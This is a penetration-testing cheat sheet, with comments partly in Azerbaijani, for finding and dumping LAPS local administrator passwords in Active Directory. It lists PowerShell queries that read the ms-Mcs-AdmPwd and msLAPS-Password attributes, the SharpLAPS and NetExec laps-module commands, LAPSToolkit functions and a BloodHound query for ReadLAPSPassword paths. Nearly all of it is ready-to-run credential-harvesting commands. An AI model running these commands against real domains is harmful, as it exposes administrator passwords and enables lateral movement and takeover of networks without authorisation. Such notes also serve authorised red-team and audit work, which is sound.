# LAPS Enabled Computers
```
Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext -Filter {name -like "ms-Mcs-AdmPwd"}
Get-ADOrganizationalUnit -Filter * | Get-ObjectAcl | Where-Object {$_.ObjectType -eq "Object-Guid-of-LAPS"}

Get-DomainComputer -Properties ms-Mcs-AdmPwdExpirationTime | Where-Object {$_.ms-Mcs-AdmPwdExpirationTime -ne $null} | Select-Object name, distinguishedname
```

# Read Permissions
```
Get-DomaintObjectAcl -Identity "OU=Workstations,DC=domain,DC=local" | Where-Object {$_.ObjectType -eq "Object-Guid-of-LAPS-Attribute"}
```

# LAPS Dumping with Powershell
```
Get-ADComputer -Filter 'ms-Mcs-AdmPwd -like "*"' -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime | Select-Object Name, ms-Mcs-AdmPwd
Get-ADComputer -Filter * -Properties msLAPS-Password | Select-Object Name, msLAPS-Password
```

# LAPS Dumping with tools
```
# Komanda xəttindən icra
.\SharpLAPS.exe --outformat table

# CME vasitəsilə LAPS parollarını dump etmək
nxc ldap <Domain_Controller_IP> -u 'user' -p 'password' --module laps
```

# LAPSToolkit
```
Import-Module ./LAPSToolkit.ps1

## Bütün LAPS Parolları
Get-LAPSComputers

## LAPS parollarını oxuma yetkisi olan qrupları tapmaq:
Find-LAPSDelegatedGroups

## Müəyyən bir istifadəçinin hansı kompyuterlərin parolunu oxuya biləcəyini yoxlamaq:
Get-LAPSUserPerms -UserName "testuser"
```

# Bloodhound
```
MATCH p=(u:User)-[:AllExtendedRights|:ReadLAPSPassword*1..]->(c:Computer) RETURN p
```
